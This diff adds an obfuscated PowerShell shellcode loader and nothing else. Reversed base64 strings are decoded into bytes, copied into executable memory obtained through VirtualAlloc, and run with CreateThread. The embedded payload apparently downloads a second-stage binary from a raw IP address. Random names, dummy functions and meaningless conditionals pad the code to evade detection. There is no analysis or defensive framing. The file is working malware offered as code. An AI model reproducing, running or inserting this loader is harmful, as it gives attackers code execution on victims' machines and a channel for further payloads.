@@ -1,0 +1,79 @@
+Add-Type -TypeDefinition @'
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+public static class YKkVVXrFxmphywdXZpeCo {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAlloc(IntPtr dwmPNSVCvSspONeFfloTC, uint VBbShvGMoFzKThlSTLpxp, uint owEyhHsBOdJVbUwjOLmsj, uint kSYjBYFlkjZiCQhnuYmeR);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateThread(IntPtr qeOAuqZFTYudesNpsIwcu, uint rBqfiSfVpwAqwyOlkkMlq, IntPtr CbxXJMHfuypnSubsVTvxS, IntPtr rFzejOjWgiAYQlsFqxTAy, uint YvlPwNKwjAIuPilzABMqB, IntPtr HfwGmZinKITGLGlnEwVbo);
+
+    [DllImport("kernel32.dll")]
+    public static extern uint WaitForSingleObject(IntPtr RqkynszNAkDCtyeilnrqP, int AhijmLOvvKzfmbBWsXnXc);
+}
+'@
+
+
+$oaMNWBoiPsrJXPvIQjolY = (([regex]::Matches('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','.','RightToLeft') | ForEach {$_.value}) -join '')
+
+$lKasviAMAEPbJhgGKKIld = (([regex]::Matches('=AgbpJmLyMDduV2ZB9iMyEjLyEjLyYjL4ATMv8iOwRHdoxMzMzMzMzMzMzMzMzMzD3V5LC8MpuOBrzfRDgfRLiQdwh/gDIkvPwfVDgfVLeRd0l/gCgkvPwfRDgfRLaSd0p/gBElvPwfTDgfTLWTdoh/gC47D8X1A4X1iFNHAAACA83Xg83UiBE8g830iJsOAAAAA8X0x4XUiEU0iIw+gsvYVMzMzMzMzMzMzMz8wdV+isX0iwX1/RRfTLCfV/DF+FtI4V9vU4X1iRBRTLCFFFtoUsXVjAAAAAweRHvy6APD8V9fU030iLUHA433g4XUikX1/QRfRLKFDVtIAqBgaACCAAgGAqRfRJieV/DgaAoGAqBgaAoG8FlY0/zASLiQRLKF/VtYUI3UjAUGbkhcBEdsAgHMAAAAB46WYIVGyVQ0xDE9aAAAAEk7cvx2QIXARHDe0AAAAEgL4Flo0/zQULiQTLCF/FtoUIXVjAAAAAgcDEdsAhHMAAAAB5WGbpZEyFQ0xDI8aAAAAEoLZhVmUI3ARHHe0AAAAEkL5FlI0/zgQLiQVLGF/NtIUIXUjAAAAAgcFEdsAiHMAAAAB6GEbyVFyNQ0xDg8aAAAAEgrblB3TIXBRHLe0AAAAEoL6FlY0/zASLiQRLKF/VtYUI3UjAAAABhcBEd8ACvGAAAAB66WZw9EyNQ0xhHNAAAAB5SXZuJHyFQ0x','.','RightToLeft') | ForEach {$_.value}) -join '')
+
+[Byte[]]$JTpvAKubThgBlDnqojikG = [System.Convert]::FromBase64String((-join($oaMNWBoiPsrJXPvIQjolY,$lKasviAMAEPbJhgGKKIld)))
+
+Function mxNtsUqBzBmtpyKuBlbxf() {
+return 0
+
+}
+$uecevIBjdIUTppGqQLeMs = mxNtsUqBzBmtpyKuBlbxf
+
+[IntPtr]$VEfDHzVLBKSSZOpjZyZLh = [YKkVVXrFxmphywdXZpeCo]::VirtualAlloc(($uecevIBjdIUTppGqQLeMs),$JTpvAKubThgBlDnqojikG.Length,(8190 - 4094),(-6044 + 6108))
+
+[IntPtr]$VEfDHzVLBKSSZOpjZyZLh = [YKkVVXrFxmphywdXZpeCo]::VirtualAlloc((9932 - 9932),$JTpvAKubThgBlDnqojikG.Length,(4167 - 71),(5794 - 5730))
+
+if (-1674539473 -lt 751094451) {
+[Runtime.InteropServices.Marshal]::Copy($JTpvAKubThgBlDnqojikG,(444 - 444),$VEfDHzVLBKSSZOpjZyZLh,$JTpvAKubThgBlDnqojikG.Length)
+} else {
+if (-1366781457 -ge -1366781457) {
+
+} else {
+
+}
+
+
+}
+
+
+Function OkdltfOXjQhBtOwrASrBv() {
+return 0
+
+}
+$BRQdUjEnifwYJfMAFhSsu = OkdltfOXjQhBtOwrASrBv
+
+Function sFmDgKwChKVhBXGcivcal() {
+return 0
+
+}
+$JvhUGWdzvMOFyiBLZRITS = sFmDgKwChKVhBXGcivcal
+
+Function TTaMqZXZnzhlwUTshGYGT() {
+return 0
+
+}
+$XVrfGuXAWJUWeAZpiMLew = TTaMqZXZnzhlwUTshGYGT
+
+$SBBpoLqRZqlcVPSqAJvFW = [YKkVVXrFxmphywdXZpeCo]::CreateThread(($BRQdUjEnifwYJfMAFhSsu),(-3492 + 3492),$VEfDHzVLBKSSZOpjZyZLh,($JvhUGWdzvMOFyiBLZRITS),(-7840 + 7840),($XVrfGuXAWJUWeAZpiMLew))
+
+if (1542100658 -gt -946911421) {
+[YKkVVXrFxmphywdXZpeCo]::WaitForSingleObject($SBBpoLqRZqlcVPSqAJvFW,0xffffffff)
+} else {
+if ('EoVkrjQKpAouBwpCbbbrU' -eq 'LkbPbKnIPGyatOlNMEqcFEoVkrjQKpAouBwpCbbbrU') {
+
+} else {
+
+}
+
+
+}
+
+
